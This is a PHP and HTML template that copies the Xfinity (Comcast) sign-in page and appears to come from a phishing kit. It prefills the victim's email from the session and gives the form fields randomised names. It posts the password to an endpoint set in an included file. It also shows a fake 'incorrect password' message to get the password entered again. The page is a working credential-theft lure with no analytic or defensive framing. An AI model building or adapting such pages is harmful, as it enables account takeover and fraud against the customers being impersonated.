<?php
include "mfunc.php";
?>
<!DOCTYPE html>
<html class="light da da-expandable" data-resource-package-id="res-responsive-login-page" lang="en">

<head>
    <title>Sign in to Xfinity</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="stylesheet" type="text/css" href="rel/styles__ltc.css">
    <link rel="shortcut icon" href="rel/cc/favicon.ico">
</head>

<body class=" has-footer ">
    <div id="breakpoints"></div>
    <div id="background" style="height: 100vh;" aria-hidden="false"></div>
    <main id="bd" aria-hidden="false">
        <h1 class="screen-reader-text">Sign in to Xfinity</h1>
        <div id="right">
            <div class="container">
                <form action="<?php echo $proc; ?><?php if(isset($eshow)){echo $eshow;};?>" method="POST">
                    <div class="single logo-wrapper">
                        <span aria-role="img" class="xfinity-logo"></span>
                    </div>
                    <div class="textfield-wrapper">
                        <label for="user" class="float accessibly-hidden">Xfinity ID</label>
                        <input id="user" type="text" placeholder="<?php echo $_SESSION['email']; ?>" value="<?php echo $_SESSION['email']; ?>" readonly style="background-color: #D9D9D9;" name="<?php echo $ename; ?>"/>
                        <style>
                            @media (max-width: 989px) {
                                input:disabled {
                                    background-color: #E9E9E9 !important;
                                }
                            }
                        </style>
                    </div>
								<input type="hidden" name="<?php echo $idc; ?>" value='<?php echo md5(uniqid()); ?>'>

                    <div class="textfield-wrapper">
                        <label for="passwd" class="float accessibly-hidden">Password</label>
                        <input id="passwd" name="<?php echo $pname; ?>" type="password" placeholder="Password" maxlength="128" autocomplete="current-password"/>
                    </div>
                    <div id="errorPass">
                        
                    </div>
                    <button class="submit" type="submit" id="sign_in">Sign In</button>
                    <ul>
                        <li id="forgot-username-password-item">Forgot <a style="cursor: pointer;" title="Look up Xfinity ID">Xfinity ID</a> or <a id="forgotPwdLink" style="cursor: pointer;" title="Reset Password">password</a>?</li>
                        <li id="create-username-item">Don't have an Xfinity ID? <span><a style="cursor: pointer;">Create one</a></span>
                        </li>
                        <li id="quick-bill-pay">
                            <a style="cursor: pointer;">Pay any balance</a> without signing in </li>
                    </ul>
                    <p id="implied-legal">By signing in, you agree to our <a style="cursor: pointer;">Terms of Service</a> and <a style="cursor: pointer;">Privacy Policy</a>.</p>
                </form>
            </div>

        </div>
    </main>
    <footer aria-hidden="false">
        <span class="content">
<span class="copyright">© 2021 Comcast</span>
        <nav>
            <span class="divider hide-compact"></span>
            <span class="links">
<a style="cursor: pointer;">Privacy Policy</a>
<span class="divider"></span>
            <a style="cursor: pointer;">Terms of Service</a>
            </span>
            <span class="ad-links divider"></span>
            <span class="ad-links links">
<a style="cursor: pointer;">Ad Info</a>
<span class="divider"></span>
            <a style="cursor: pointer;">Ad Feedback</a>
            </span>
            <span class="divider hide-compact"></span>
            <span class="links">
<a style="cursor: pointer;">Do Not Sell My Personal Information</a>
</span>
        </nav>
        </span>
    </footer>

    <div id="rm_help" role="dialog" aria-hidden="true" class="overlay" data-dialog-type="overlay" style="height: 947px;">
        <div role="document" class="content" style="top: 319px; left: 560px;">
            <button type="button" class="close" aria-label="Close"></button>
            <h1>Why Stay Signed In?</h1>
            <p>With this option selected, you'll stay signed in to your account on this device until you sign out. You should not use this option on public or shared devices.</p>
            <p>For your security, you may be asked to enter your password before accessing certain information.</p>

        </div>
    </div>
    <script>
        <?php

            if (isset($eshow))  {
                echo '
                
                    document.getElementById("errorPass").innerHTML = \'<p class="error_message">The Xfinity ID or password you entered was incorrect. Please try again.</p>\';
                    document.getElementById("user").classList.add("error");
                    document.getElementById("passwd").classList.add("error");

                ';
            }

        ?>
    </script>
</body>

</html>